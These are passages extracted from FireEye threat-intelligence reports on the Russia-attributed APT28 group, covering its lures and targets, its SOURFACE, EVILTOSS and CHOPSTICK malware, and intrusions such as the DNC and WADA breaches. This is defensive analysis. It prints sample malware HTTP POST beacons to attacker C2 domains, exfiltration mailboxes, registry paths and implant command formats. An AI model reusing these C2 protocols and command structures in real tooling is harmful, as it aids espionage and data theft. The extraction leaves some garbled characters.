We identified an APT28 lure containing a decoy document with a list of British officers and U.S. and Canadian military attachés in London. Finally, APT28 used a lure that contained an apparent non-public listing of contact information for defense attachés in the ﬁAnkara Military Attaché Corps (AMAC),ﬂ which appears to be a professional organization of defense attachés in Turkey. Figure 4: Decoy document used against military attaches in 2012 16 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? APT28 Targets European Defense ExhibitionsIn addition to targeting European security organizations and governments, it appears that APT28 is targeting attendees of European defense exhibitions. Some of the APT28- registered domains imitated those of defense events held in Europe, such as the Farnborough Airshow 2014, EuroNaval 2014, EUROSATORY 2014, and the Counter Terror Expo. In September 2014, APT28 registered a domain (smigroup-online.co.uk) that appeared to mimic that for the SMi Group, a company that plans events for the ﬁDefence, Security, Energy, Utilities, Finance and Pharmaceutical sectors.ﬂ Among other events, the SMi Group is currently planning a military satellite communications event for November 2014. Targeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies, as well as the victim organizations™ operations, communications, and future plans. Targeting organizations and professionals involved in these defense events would likely provide APT28 with an opportunity to procure intelligence pertaining to new defense technologies. 17 fireeye.com APT28 has targeted a variety of organizations that fall outside of the three themes we highlighted above. However, we are not profiling all of APT28™s targets with the same detail because they are not particularly indicative of a specific sponsor™s interests. They do indicate parallel areas of interest to many governments and do not run counter to Russian state interests.

APT28 MALWARE INDICATES SKILLED RUSSIAN DEVELOPERS APT28™s tools are suggestive of the group™s skills, ambitions, and identity. Our analysis of some of the group™s more commonly used tools indicates that APT28 has been systematically updating their tools since 2007. APT28 is most likely supported by a group of developers creating tools intended for long-term use and versatility, who make an effort to obfuscate their activity. This suggests that APT28 receives direct ongoing financial and other resources from a well-established organization, most likely a nation state government. APT28™s malware settings suggest that the developers have done the majority of their work in a Russian language build environment during Russian business hours, which suggests that the Russian government is APT28™s sponsor. Some of APT28™s more commonly used tools are the SOURFACE downloader, its second stage backdoor EVILTOSS, and a modular family of implants that we call CHOPSTICK.SOURFACE: This downloader is typically called Sofacy within the cyber security community. However because we have observed the name ﬁSofacyﬂ used to refer to APT28 malware generally (to include the SOURFACE dropper, EVILTOSS, CHOPSTICK, and the credential harvester OLDBAIT), we are using the name SOURFACE to precisely refer to a specific downloader. This downloader obtains a second-stage backdoor from a C2 server. CORESHELL is an updated version of SOURFACE. EVILTOSS: This backdoor has been delivered through the SOURFACE downloader to gain system access for reconnaissance, monitoring, credential theft, and shellcode execution. CHOPSTICK: This is a modular implant compiled from a software framework that provides tailored functionality and flexibility. Our analysis of some of the group™s more commonly used tools indicates that APT28 has been systematically updating their malware since 2007. 20 fireeye.com A number of the malware variants that we profile below, especially the CHOPSTICK family, demonstrate formal coding practices indicative of methodical, diligent programmers. The modularity of CHOPSTICK alone, with its flexible and lasting platform, demonstrates planning for long-term use and versatility. We have also noted that APT28 tailors implants to their target environments, configuring them to use local network resources such as email servers. APT28 has attempted to obfuscate their code and implement counter-analysis techniques:Figure 6: Typical deployment of SOURFACE ecosystem Spearphishing EmailDocument with exploitDropper malware SOURFACE downloader Deploys 2nd stage droppers 2nd stage implantObtains 2nd stageC2 ServerOne of the latest samples of CORESHELL includes counter-reverse engineering tactics via unused machine instructions. This would hinder static analysis of CORESHELL behavior by creating a large amount of unnecessary noise in the disassembly. A number of CORESHELL droppers also conduct runtime checks, attempting to determine if they are executing in an analysis environment, and if so, they do not trigger their payloads. Many samples across the SOURFACE/ CORESHELL, CHOPSTICK, and EVILTOSS 21 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? malware families obfuscate strings that are decoded at runtime. Two of the malware families (SOURFACE/CORESHELL and EVILTOSS) use the same decryption sequence and similar algorithms for string encoding and decoding. These families encode their strings at compile time using a custom stream cipher. From a high level, these ciphers share a similar design across the malware families but differ slightly in the internal arithmetic operations. APT28 has employed RSA encryption to protect files and stolen information moved from the victim™s network to the controller. APT28 has made incremental and systematic changes to the SOURFACE downloader and its surrounding ecosystem since as early as 2007. These changes indicate a long-standing and dedicated development effort behind APT28. We have observed samples of the SOURFACE downloader compiled between 2007 and 2014. We call SOURFACE (samples are frequently named netids.dll) a first stage downloader because its primary job is to retrieve a second stage payload from a C2 server. Until 2013, the SOURFACE downloader used hard-coded IP addresses for C2 communications, whereas the future CORESHELL samples use domains.EVOLUTION OF SOURFACE ECOSYSTEM INDICATES SYSTEMATIC DEVELOPMENT WHAT IS A MALWARE ECOSYSTEM? First, a malware family is a collection of malware in which each sample shares a significant amount of code with all of the others. There are exceptions: for example, some files contain public and standard code libraries that we do not take into consideration when making a family determination.A malware ecosystem is a group of malware families that work together to perform the same objective. Perhaps the simplest and most typical ecosystem is a dropper and a backdoor that are used together. They may not share the same code structure, but they are related because one drops and installs the other. The ecosystem surrounding the SOURFACE downloader frequently consists of a dropper, which installs SOURFACE. The SOURFACE downloader then receives another dropper from its C2 server, and this second dropper installs a second stage backdoor, which is usually EVILTOSS. 22 fireeye.com In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader. They started by changing the compiled DLL name to ﬁcoreshell.dllﬂ and making minor changes to the network communications, as seen in Figure 7.The hostname, volume serial number and OS version data are encoded in the new URL format. As seen in the table below, the SOURFACE/ CORESHELL developers also made other modifications that changed the exported function name and file size over time. 17 SOURFACE with minor changes to network communications (see Figure 7). 18 Basic anti-debug measures added (process listing, rand timing, is DebuggerPresent). 19 Switches from loading a secondary DLL (netui.dll/WinIDS.dll) to uploading the contents of %temp%\\\\chkdbg.log. 20 Statically links msvcrt library. 21 Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used, then reversed back after use. 22This version added assembly level obfuscation, which slows down analysis. This variant requires the OS to be at least Windows Vista.

However, it contains more capabilities, including the ability to provide access to the file system and registry, enumerate network resources, create processes, log keystrokes, access stored credentials, and execute shellcode. The backdoor encrypts data that it uploads with an RSA public key. Many of its variants we have seen are named netui.dll. EVILTOSS variants may use the Simple Mail Transfer Protocol (SMTP) to send stolen data in an attachment named ﬁdetaluri.datﬂ. The backdoor attaches this file to a preformatted email and sends it out through a victim™s mail server. Interestingly, we found an antivirus report from 200423 detailing what appears to be an early variant of EVILTOSS. The backdoor was installed alongside the NATO-themed decoy document depicted in Figure 8. The backdoor sent data via SMTP to nato_smtp@mail.ru and received its tasking via POP from nato_pop@mail.ru. Although we have not conclusively attributed this sample to APT28, it does suggest the possibility that APT28 has been operating since as early as 2004.24 23 http://ae.norton.com/security_response/print_writeup.jsp?docid=2004-081915-1004-99 24 Although the malware family and interest in NATO make it likely that APT28 was involved, we cannot conclusively attribute this sample to APT28 based on these factors alone. We have no evidence that they controlled the C2 for this malware or were using EVILTOSS in 2004. APT28 could have possibly obtained this source code from another group of actors. Also, malware can be passed from group to group. The other malware that we associate with APT28 in this paper is more strongly attributed to the group using additional factors, some of which we mention in Appendix A.In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader. 24 fireeye.com During our research, we discovered that APT28 uses a backdoor developed using a modular framework. We call this backdoor CHOPSTICK, a somewhat ironic name that comes from our semi-random name generator. The modular design allows flexible options for compiling variants with different capabilities as needed, as well as deploying additional capabilities at runtime. This allows the developers to make targeted implants, including only the capabilities and protocols necessary for a specific environment. Such a modular framework suggests the group has had an organized development effort since as early as 2007. A formal development environment, in which code is versioned and well-organized, would almost certainly be required to track and define the various modules that can be included in the backdoor at compile time. CHOPSTICK variants may move messages and information using at least three methods:1. Communications with a C2 server using HTTP. These protocols are covered in more detail in Appendix D. 2. Email sent through a specified mail server. One CHOPSTICK v1 variant contained modules and functions for collecting keystroke logs, Microsoft Office documents, and PGP files. The monitoring for new files of interest is performed by a ﬁDirectory Observerﬂ module. In one sample this information was intended to be sent via SMTP using a Georgian MIA mail server. It used one of four embedded sender email addresses (@mia.gov.ge) to send files via email to another email address on the same mail server. All information required for the email was hardcoded in the backdoor. 3. Local copying to defeat closed networks. One variant of CHOPSTICK focuses on apparent air gap / closed network capabilities by routing messages between local directories, the registry and USB drives. A modular development framework suggests the group has had an organized development effort since as early as 2007. MODULAR IMPLANTS INDICATE A FORMAL DEVELOPMENT ENVIRONMENT 25 fireeye.com During our research into APT28™s malware, we noted two details consistent across malware samples. The first was that APT28 had consistently compiled Russian language settings into their malware. The second was that malware compile times from 2007 to 2014 corresponded to normal business hours in the UTC + 4 time zone, which includes major Russian cities such as Moscow and St. Petersburg. Use of Russian and English Language Settings in PE ResourcesPE resources include language information that can be helpful if a developer wants to show user interface items in a specific language.25 Non-default language settings packaged with PE resources are dependent on the developer™s build environment. Each PE resource includes a ﬁlocaleﬂ identifier with a language ID ﬁcomposed of a primary language identifier indicating the language and a sublanguage identifier indicating the country/region.ﬂ 26 At the time of the writing of this paper, we had identified 103 malware samples that were both attributed to APT28 and contained PE resources. Table 5 shows the locale identifiers 27 with associated language and country/region for these samples.Table 5: Locale and language identifiers associated with APT28 malware Locale ID Primary languageCountry/RegionNumber of APT28 samples0x0419Russian (ru)Russia (RU)590x0409English (en)United States (US)270x0000 or 0x0800Neutral locale / System default locale languageNeutral160x0809English (en)United Kingdom (GB)1APT28 MALWARE INDICATES RUSSIAN SPEAKERS IN A RUSSIAN TIME ZONE 25Microsoft Developer Network Œ Multiple Language Resources http://msdn.microsoft.com/en-us/library/cc194810.aspx 26, 27 Microsoft Developer Network Œ Language Identifier Constants and Strings http://msdn.microsoft.com/en-us/library/dd318693.aspx 26 fireeye.com APT 28: A Window into Russia™s Cyber Espionage Operations? The samples with Russian language settings were compiled between late 2007 and late 2013, as depicted in Figure 9. This consistency over a long timeframe suggests that the developers of APT28 malware were using a build environment Figure 9: Number of APT28 samples with Russian language settings by compile month2007200820092010201120122013DecemberMarch MayAugustFebruaryMaySeptemberFebruaryMarch AugustSeptemberOctoberNovemberDecemberAprilJuneSeptemberDecemberAprilMayJuneJulyOctoberDecemberJanuaryJulyAugustOctoberNovemberDecember0 1 2 3 4 5 6 7 8 9with Russian language settings at least some of the time and made no effort to obscure this detail. Overall, the locale IDs suggest that APT28 developers can operate in both Russian and English. 27 fireeye.com Compile Times Align with Working Hours in Moscow and St. Petersburg Of the 140 malware samples that we have attributed to APT28 so far, over 89% were compiled between 0400 and 1400 UTC time, as depicted in Figure 10. Over 96% were compiled between Monday and Friday. This parallels the working hours in UTC+0400 (that is, compile times begin about 8AM and end about 6PM in this time zone). This time zone includes major Russian cities such as Moscow and St. Petersburg.

We assess that APT28 is most likely sponsored by the Russian government. We summarize our key observations about APT28 in Figure 11 below. APT28™s characteristicsŠtheir targeting, malware, language, and working hoursŠhave led us to conclude that we are tracking a focused, long- standing espionage effort.

These individuals may share the same set of tasks, coordinate targets, and share tools and methodology. They work together to gain access to their targets and steal data.The art of attributing disparate intrusion activities to the same threat group is not always simple. Different groups may use similar intrusion methodologies and common tools, particularly those that are widely available on the Internet, such as pwdump, HTran, or Gh0st RAT. There may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing of personnel. Individual threat actors may move between groups either temporarily or permanently. A threat actor may also be a private citizen who is hired by multiple groups. Multiple groups, on occasion, compromise the same target within the same timeframe. Distinguishing one threat group from another is possible with enough information, analytical experience, and tools to piece it all together. We can analyze multiple incidents and tell by the evidence left behind that a given incident was the result of one threat group and not another. Threat actors leave behind various forensic details. They may send spear phishing emails from a specific IP address or email address. Their emails may contain certain patterns; files have specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have command and control IP addresses or domain names embedded. These are just a few examples of the myriad of forensic details that we consider when distinguishing one threat group from another. At the most basic level, we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same actor or group of actors were involved. We track all of the indicators and significant linkages associated with identified threat groups in a proprietary database that comprises millions of nodes and linkages between them. In this way, we can always go back and answer ﬁwhyﬂ we associated cyber threat activity with a particular group. 30 fireeye.com APPENDIX B: TIMELINE OF APT28 LURESYEARLURE TOPICMALWARE 2010Iran™s work with an international organization (internal document) SOURFACE 2011File named ﬁmilitary cooperation.docﬂSOURFACE, OLDBAIT2011Georgian language IT document for Ministry of Internal Affairs (internal document) SOURFACE 2011ﬁUSB Disk Security is the best software to block threats that can damage your PC or compromise your personal information via USB storage.ﬂSOURFACE 2012Food security in Africa (ﬁFood and nutrition crisis reaches peak but good forecast for 2013ﬂ) SOURFACE 2012ﬁIDF Soldier Killed and another injured in a Terror Attackﬂ SOURFACE 2012ﬁEcho Crisis Reportﬂ on Portugal™s forest fires SOURFACE 2012ﬁFBI to monitor Facebook, Twitter, Myspaceﬂ SOURFACE 2012Georgia (US state, not the country of Georgia) murder case uncovers terror plot SOURFACE 2012Military attaches in London (internal document) SOURFACE 2013South Africa MFA document CHOPSTICK, CORESHELL2013John Shalikashvili (Georgian-Polish-American US General) Questionnaire CORESHELL2013Asia Pacific Economic Cooperation Summit 2013 reporters (internal document) SOURFACE 2013Defense Attaches in Turkey (internal document) CHOPSTICK, CORESHELL2013Turkish Cypriot news about Syria chemical weapons CHOPSTICK, CORESHELL2013Georgian language document about drivers™ licenses (internal document) EVILTOSS 2013Apparent Reason Magazine-related lure sent to a journalist CORESHELL2014Mandarin language document, possibly related to a Chinese aviation group (non-public document) CORESHELL2014Netherlands-Malaysia cessation of hostilities; related to Ukraine airline attack CORESHELL 31 fireeye.com SOURFACE is a downloader that obtains a second stage backdoor from a C2 server. Over time the downloader has evolved and the newer versions, usually compiled with the DLL name ‚coreshell.dll™, are distinct enough from the older versions that we refer to it as SOURFACE/CORESHELL or simply CORESHELL. This appendix focuses on these newer versions. CORESHELL uses two threads to communicate with its C2 server. The first thread sends beacons that contain the process listing of the compromised host. The second thread is responsible for downloading and executing stage APPENDIX C: SOURFACE/CORESHELL two payloads. Messages are sent using HTTP POST requests whose bodies contain encrypted and Base64 encoded data. The encryption algorithm is a custom stream cipher using a six-byte key. Commands from the controller to the CORESHELL implant are encrypted using another stream cipher but this time using an eight-byte key. CORESHELL has used the same user agent string (ﬁMSIE 8.0ﬂ) that SOURFACE previously used, but in more recent samples CORESHELL uses the default Internet Explorer user agent string obtained from the system.

This framework allows for a diverse set of capabilities across malware variants sharing a common code base. CHOPSTICK may communicate with external servers using SMTP or HTTP. This appendix documents variants using HTTP communications. The first time CHOPSTICK is executed, it may encrypt and store configuration data in the Registry key HKU\\\\S-1-5-19_Classes\\\\Software\\\\Microsoft\\\\MediaPlayer\\\\{E6696105-E63E-4EF1-939E-15DDD83B669A}\\\\chnnl. The user HKU\\\\S-1-5-19 corresponds to the LOCAL_SERVICE account SID. The configuration block is encrypted using RC4 encryption. The key is a combination of a 50-byte static key and a four-byte salt value randomly generated at runtime. The static key is derived from opcodes in the backdoor. CHOPSTICK collects detailed information from the host including the Windows version, CPU architecture, Windows Firewall state, User Account Control (UAC) configuration settings on Windows Vista and above and Internet Explorer settings. It also tests for the installation of specific security products (Table 9) and applications (Table 10).

It creates a thread that records user activity on the host, capturing desktop screenshots in JPEG format, tracks current window focus, collects keystrokes, and scrapes window contents (text, context menus, etc.). User activity is captured once every 500 milliseconds and logged in an HTML-like format. The thread writes user activity log messages to the ﬁ check_mes_v5555ﬂ mailslot in plain text. CHOPSTICK reads messages from the mailslot, encrypts them using RC4, and then stores the encrypted message in an edg6EF885E2.tmp temporary file. The RC4 encryption used here also uses a 50- byte static key plus four-byte random salt value. After approximately 60 seconds of execution time, CHOPSTICK begins communicating with one of its C2 servers over HTTP. After sending an initial HTTP GET request it uploads the file contents of edg6EF885E2. tmp to the C2 server using HTTP POST requests. It does not wait for a response from the server to begin uploading. Once the contents of edg6EF885E2.tmp are uploaded, CHOPSTICK deletes the file. Figure 13 below contains an example of an HTTP POST request uploading a segment from edg6EF885E2.tmp. Figure 13: Sample CHOPSTICK v2 HTTP POST POST /search/?btnG=D-3U5vY&utm=79iNI&ai=NPVUnAZf8FneZ2e_qptjzwH1Q&PG3pt=n-B9onK2KCi HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0 Host: windows-updater.com Content-Length: 77 Cache-Control: no-cache1b2x7F4Rsi8_e4N_sYYpu1m7AJcgN6BzDpQYv1P2piFBLBqghXiHY3SIfe8cUHHYojeXfeyyOhw==28A mailslot is a Windows inter-process communication (IPC) mechanism similar to a named pipe, but is designed for one-way communications between processes and can also be used across the network. 38 fireeye.com CHOPSTICK uses a URL-safe Base64 encoding, using an alphabet that substitutes ﬁ+ﬂ and ﬁ/ﬂ for ﬁ-ﬂ and ﬁ_ﬂ, respectively. Each HTTP request contains multiple Base64 encoded URL parameters, however only one parameter contains information encoded by the malware (ﬁai=ﬂ) and the rest of the URL parameters appear to be randomly generated per request. CHOPSTICK encrypts an 11-byte sequence in the ﬁai=ﬂ parameter. The purpose of this parameter appears to be to uniquely identify the particular instance of the backdoor to the C2 server. The Base64 encoded text of this parameter begins with a number of randomly generated alphabetical characters presumably intended to prevent people from Base64 decoding the whole string without some knowledge of how the malware family works. The first four bytes of the message are an XOR key for the remainder of the data. Once decrypted using the XOR key, an 11-byte sequence is revealed. The first seven bytes are static, and are hard-coded in CHOPSTICK, while the last four bytes appear to be unique. The message body of the POST request is also Base64 encoded. This encoded string is also prefixed with random characters designed to break the output of a Base64 decode operation on the entire string. The first 15 bytes of the decoded message body comprise another 11-byte sequence similar to the sequence stored in the ﬁai=ﬂ parameter as described above. Decrypting these bytes yields another static seven-byte sequence, followed by four unique bytes. The remainder of the message body consists of the RC4 encrypted data containing the HTML-formatted user activity log, edg6EF885E2.tmp. After uploading edg6EF885E2.tmp, CHOPSTICK continues to query its C2 servers for commands using HTTP GET requests. The malware contains code which allows it to load or memory-map external modules that export the following functions: SendRawPacket, GetRawPacket, InitializeExp, DestroyExp, IsActiveChannel, GetChannelInfo, SetChannelInfo, Run, GetModuleInfo, GiveMessage, and TakeMessage. 39 fireeye.com ModularityCHOPSTICK backdoors are compiled within a modularized development framework. This means that two separate CHOPSTICK backdoors may contain vastly different functionality, depending on which modules were included at compile time. The modules that are included in an instance of CHOPSTICK may be reported to the C2 server as part of POST messages. Figure 14 includes an example from a CHOPSTICK v1 variant:Figure 14: Sample CHOPSTICK v1 HTTP POST including module identificationPOST /webhp?rel=psy&hl=7&ai=d2SSzFKlR4l0dRd_ZdyiwE17aTzOPeP-PVsYh1lVAXpLhIebB4= HTTP/1.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-us,en;q=0.5 Accept-Encoding: gzip, deflate User-Agent: Mozilla/5.0 (Windows NT 6.; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0 Host: adobeincorp.com Content-Length: 71 Cache-Control: no-cached2SSzFKchH9IvjcM55eQCTbMbVAU7mR0IK6pNOrbFoF7Br0Pi__0u3Sf1Oh30_HufqHiDU= 40 fireeye.com To decode the POST content, the first step is to remove characters from the Base64 string (the number of characters to remove may vary between different communication channels). In the example from Figure 14, the number of characters removed is seven. Once these characters are removed the decoded (but still encrypted) text looks like this: 00000000 72 11 fd 22 f8 dc 33 9e 5e 40 24 db 31 b5 40 53 r..ﬂ..3.^@$.1.@S 00000010 b9 91 d0 82 ba a4 d3 ab 6c 5a 05 ec 1a f4 3e 2f ........lZ....>/ 00000020 ff d2 ed d2 7f 53 a1 df 4f c7 b9 fa 87 88 35 .....S..O.....5The first two words (ﬁ72 11ﬂ and ﬁfd 22ﬂ) are checksums that are used to validate the message. The next 4 bytes ﬁf8 dc 33 9eﬂ are a salt value that is appended to the end of an RC4 key. Once decrypted, the message looks like the following: 00000000 72 11 fd 22 f8 dc 33 9e 56 34 4d 47 4e 78 5a 57 r..ﬂ..3.V4MGNxZW 00000010 6c 76 63 6d 68 6a 4f 47 39 79 5a 51 3d 3c 3c ee lvcmhjOG9yZQ=<<. 00000020 01 00 00 01 00 23 01 10 23 01 11 23 01 13 23 .....#..#..#..#The strings ﬁV4MGNxZWlvcmhjOG9yZQﬂ and ﬁ=<<\\\\xeeﬂ are hardcoded in the implant.

The corresponding modules in each backdoor also are consistently identified with 0x01 and 0x02, respectively, in the second byte. In both variants the modules with keystroke log, file system access, and command shell capabilities have the consistent identifiers 0x10, 0x11, and 0x13, respectively, in the first byte. This suggests that the first byte in the module ID identifies the module type whereas the second byte identifies the kernel version. The kernel sends commands to each module using its module ID. The commands that each module understands are likely consistent from build to build. Table 14 and Table 15 show examples of commands that each module understands.Table 14: Commands understood by modFS (0x1101) module Command ID DescriptionExample01Find file\\\\x01\\\\x11\\\\x01Directory&file&01 02Read file\\\\x01\\\\x11\\\\x02Directory&file&01 03Write file \\\\x01\\\\x11\\\\x03Directory&file&Contents 04Delete file\\\\x01\\\\x11\\\\x04Directory&file&01 05Execute file\\\\x01\\\\x11\\\\x05Directory&file&01 Table 15: Commands understood by modProcRet (0x1301) module Command ID DescriptionExample00CMD.exe output\\\\x01\\\\x13\\\\x00Output01CMD.exe start\\\\x01\\\\x13\\\\x0102CMD.exe exit\\\\x01\\\\x13\\\\x0211CMD.exe input\\\\x01\\\\x13\\\\x11Input 43 fireeye.com OLDBAIT is a credential harvester that installs itself in %ALLUSERPROFILE%\\\\\\\\Application Data\\\\ Microsoft\\\\MediaPlayer\\\\updatewindws.exe.

APT28 Targeting of Political Entities and Intrusion Activity 4Table 2 - APT28 Network Activity Has Likely Supported Information Operations 5From Olympic Slight to Data Leak: Investigating APT28 at the World Anti-Doping Agency 6Conclusion 8Appendix 9 The Democratic National Committee™s (DNC) June 2016 announcement attributing its network breach to the Russian Government triggered an international debate over Russia™s sponsorship of information operations against the U.S. INTRODUCTION At issue is the question of proof: did the Russian Government direct the group responsible for the breaches and related data leaks? If so, is this simply a matter of accepted state espionage, or did it cross a line? Was the DNC breach part of a concerted e˜ort by the Russian Government to interfere with the U.S. presidential election? Unfortunately, we have failed to ask the most consequential question: how will Russia continue to employ a variety of methods, including hacks and leaks, to undermine the institutions, policies, and actors that the Russian Government perceives as constricting and condemning its forceful pursuit of its state aims? Our visibility into the operations of APT28 - a group we believe the Russian Government sponsors - has given us insight into some of the government™s targets, as well as its objectives and the activities designed to further them. We have tracked and pro˚led this group through multiple investigations, endpoint and network detections, and continuous monitoring. Our visibility into APT28™s operations, which date to at least 2007, has allowed us to understand the group™s malware, operational changes, and motivations. This intelligence has been critical to protecting and informing our clients, exposing this threat, and strengthening our con˚dence in attributing APT28 to the Russian Government. SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 1 SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 2OVERVIEW On December 29, 2016, the Department of Homeland Security (DHS) and Federal Bureau of Investigation (FBI) released a Joint Analysis Report con˜rming FireEye™s long held public assessment that the Russian Government sponsors APT28. Since at least 2007, APT28 has engaged in extensive operations in support of Russian strategic interests. The group, almost certainly compromised of a sophisticated and proli˜c set of developers and operators, has historically collected intelligence on defense and geopolitical issues. APT28 espionage activity has primarily targeted entities in the U.S., Europe, and the countries of the former Soviet Union, including governments and militaries, defense attaches, media entities, and dissidents and ˜gures opposed to the current Russian Government. Over the past two years, Russia appears to have increasingly leveraged APT28 to conduct information operations commensurate with broader strategic military doctrine. After compromising a victim organization, APT28 will steal internal data that is then leaked to further political narratives aligned with Russian interests. To date these have included the con˚ict in Syria, NATO-Ukraine relations, the European Union refugee and migrant crisis, the 2016 Olympics and Paralympics Russian athlete doping scandal, public accusations regarding Russian state-sponsored hacking, and the 2016 U.S. presidential election. This report details our observations of APT28™s targeting, and our investigation into a related breach. We also provide an update on shifts in the group™s tool development and use, and summarize the tactics APT28 employs to compromise its victims. SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 3APT28 TARGETING AND INTRUSION ACTIVITY In October 2014, FireEye released APT28: A Window into Russia™s Cyber Espionage Operations?, and characterized APT28™s activity as aligning with the Russian Government™s strategic intelligence requirements. While tracking APT28, we noted the group™s interest in foreign governments and militaries, particularly those of European and Eastern European nations, as well as regional security organizations, such as the North Atlantic Treaty Organization (NATO) and the Organization for Security and Cooperation in Europe (OSCE), among others. Table 1 highlights some recent examples of this activity. SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 41.

TABLE 1: APT28 TARGETING OF POLITICAL ENTITIES AND INTRUSION ACTIVITY ENTITY TIMEFRAME APT28 TARGETING AND INTRUSION ACTIVITY OSCE NOVEMBER 2016 The OSCE con˚rmed that it had su˜ered an intrusion, which a Western intelligence service attributed to APT28. 1 Germany's Christian Democratic Union (CDU) APRIL - MAY 2016 Researchers at Trend Micro observed APT28 establish a fake CDU email server and launch phishing emails against CDU members in an attempt to obtain their email credentials and access their accounts. 2,3 Pussy Riot AUGUST 2015 APT28 targets Russian rockers and dissidents Pussy Riot via spear-phishing emails. 4NATO, Afghan Ministry of Foreign A˜airs, Pakistani Military JULY 2015 APT28 used two domains (nato-news.com and bbc-news.org) to host an Adobe Flash zero-day exploit to target NATO, the Afghan Ministry of Foreign A˜airs, and the Pakistani military. German Bundestag & Political Parties JUNE 2015 Germany™s Federal O˛ce for Security in Information Technology (BSI) announced that APT28 was likely responsible for the spear phishing emails sent to members of several German political parties. The head of Germany™s domestic intelligence agency, Bundesamt für Ver -fassungsschutz (BfV), also attributed the June 2015 compromise of the Bundestag™s networks to APT28. 5,6 Kyrgyzstan Ministry of Foreign A˜airs OCTOBER 2014 THROUGH SEPTEMBER 2015 FireEye iSight Intelligence identi˚ed changes made to domain name server (DNS) records that suggest that APT28 intercepted email traf -˚c from the Kyrgyzstan Ministry of Foreign A˜airs after maliciously modifying DNS records of the ministry™s authoritative DNS servers. Polish Government & Power Exchange websites JUNE AND SEPTEMBER 2014 APT28 employed ﬁSedkitﬂ in conjunction with strategic web compro -mises to deliver ﬁSofacyﬂ malware on Polish Government websites, and the websites of Polish energy company Power Exchange. 7 SPECIAL REPORT / APT28: AT THE CENTER OF THE STORM 5TABLE 2: APT28 NETWORK ACTIVITY HAS LIKELY SUPPORTED INFORMATION OPERATIONS Since 2014, APT28 network activity has likely supported information operations designed to in˚uence the domestic politics of foreign nations. Some of these operations have involved the disruption and defacement of websites, false ˚ag operations using false hacktivist personas, and the theft of data that was later leaked publicly online. Table 2 highlights incidents in which victims su˛ered a compromise that FireEye iSIGHT Intelligence, other authorities, or the victims themselves later attributed to the group we track as APT28. All of these operations have aimed to achieve a similar objective: securing a political outcome bene˜cial to Russia. VICTIM TIMEFRAME APT28 NETWORK ACTIVITY ASSOCIATED INFORMATION OPERATIONS ACTIVITY World Anti-Doping Agency (WADA) SEPTEMBER 2016 On September 13, WADA con˚rmed that APT28 had compromised its networks and accessed athlete medical data. 8 On September 12, 2016, the ﬁFancy Bears™ Hack Teamﬂ persona claimed to have compromised WADA and released athletes™ medical records as ﬁproof of American athletes taking dop -ing.ﬂ 9 U.S. Democratic National Committee (DNC) APRIL Œ SEPTEMBER 2016 The DNC announced it had su˜ered a network compromise and that a subsequent investigation found evidence of two breaches, attributed to APT28 and APT29. FireEye analyzed the mal -ware found on DNC networks and determined that it was consistent with our previous observa -tions of APT28 tools. 10,11 In June 2016, shortly after the DNC™s announcement, the Gu -ccifer 2.0 persona claimed responsibility for the DNC breach and leaked documents taken from the organization™s network. Guccifer 2.0 continued to leak batches of DNC documents through September. 12,13 John Podesta MARCH Œ NOVEMBER 2016 Investigators found that John Podesta, Hillary Clinton™s presidential campaign chairman, was one of thousands of individuals targeted in a mass phishing scheme using shortened URLs that security researchers attributed to APT28. 14 Throughout October and into early November, WikiLeaks pub -lished 34 batches of email correspondence stolen from John Podesta™s personal email account. Correspondence of other individuals targeted in the same phishing campaign, including former Secretary of State Colin Powell and Clinton campaign sta˜er William Rinehart, were published on the ﬁDC Leaksﬂ website. 15 U.S. Democratic Congressional Campaign Committee (DCCC) MARCH - OCTOBER 2016 In July, the DCCC announced that it was investi -gating an ongoing ﬁcybersecurity incidentﬂ that the FBI believed was linked to the compromise of the DNC. House Speaker Nancy Pelosi later con˚rmed that the DCCC had su˜ered a network compromise. Investigators indicated that the actors may have gained access to DCCC systems as early as March. 16,17,18 In August, the Guccifer 2.0 persona contacted reporters cov -ering U.S. House of Representative races to announce newly leaked documents from the DCCC pertaining to Democratic candidates. From August to October, Guccifer 2.0 posted sev -eral additional installments of what appear to be internal DCCC documents on ﬁhisﬂ WordPress site. 19,20 TV5Monde FEBRUARY 2015, APRIL 2015 In February, FireEye identi˚ed CORESHELL tra˛c beaconing from TV5Monde™s network, con˚rming that APT28 had compromised TV -5Monde™s network. In April 2015, alleged pro-ISIS hacktivist group CyberCaliphate defaced TV5Monde™s websites and social media pro˚les and forced the company™s 11 broadcast channels o˝ine. FireEye identi˚ed overlaps between the domain registration details of CyberCaliphate™s website and APT28 infrastructure. 21Ukrainian Central Election Commission (CEC) MAY 2014 Ukrainian o˛cials revealed that the investigation into the compromise of the CEC™s internal net -work identi˚ed malware traced to APT28. 22 During the May 2014 Ukrainian presidential election, purported pro-Russian hacktivists CyberBerkut conducted a series of mali -cious activities against the CEC including a system compromise, data destruction, a data leak, a distributed denial-of-service (DDoS) attack, and an attempted defacement of the CEC web -site with fake election results. 23 8. ﬁWADA Con˜rms Attack by Russian Cyber Espionage Group.ﬂ World Anti-Doping Agency. 13 Sept. 2016.

